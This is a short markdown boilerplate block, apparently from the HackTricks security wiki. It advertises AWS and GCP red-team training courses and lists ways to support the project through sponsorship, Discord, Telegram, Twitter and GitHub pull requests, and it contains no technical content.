Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
